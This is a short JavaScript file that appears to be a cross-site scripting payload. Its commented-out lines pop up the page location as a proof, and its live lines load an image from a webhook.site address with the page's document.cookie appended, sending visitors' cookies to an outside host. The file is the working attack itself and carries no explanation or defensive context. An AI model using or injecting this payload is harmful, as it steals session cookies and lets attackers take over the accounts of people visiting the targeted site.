// function xssPayload() {
//   const alertMsg = 'xss ' + document.location;
//   console.log(alertMsg);
//   window.prompt(alertMsg);
// }

// console.log('XSS payload executed');
// xssPayload();

image = new Image();
image.src='https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?'+document.cookie;
